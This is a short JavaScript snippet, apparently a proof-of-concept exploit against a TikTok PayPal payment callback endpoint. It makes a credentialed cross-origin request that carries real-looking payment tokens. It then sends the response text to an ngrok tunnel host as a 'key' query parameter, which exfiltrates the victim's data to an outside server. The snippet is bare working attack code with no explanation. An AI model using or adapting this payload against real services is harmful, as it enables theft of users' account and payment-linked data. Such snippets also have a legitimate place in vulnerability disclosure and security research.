var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("GET", "http://fp.us.tiktokv.com/callback/paypal_reference/reference_redirect?redirect_url=https%3A%2F%2Ffp.us.tiktokv.com%2Fpipo_fe%2Fcheckout%2Fcommon%2Fbind_land%3Fbiz_id%3DAWUAAA7r5cfP40izkXqnRmnrVpkL%26locale%3Den&collect_request_id=AWUAAA7r5cfP40izkXqnRmnrVpkL&channel_id=paypal_reference_us05&token=EC-8A881179C72136255&ba_token=BA-17F50352VL262304Y");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(null);

function reqListener() {
    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
};
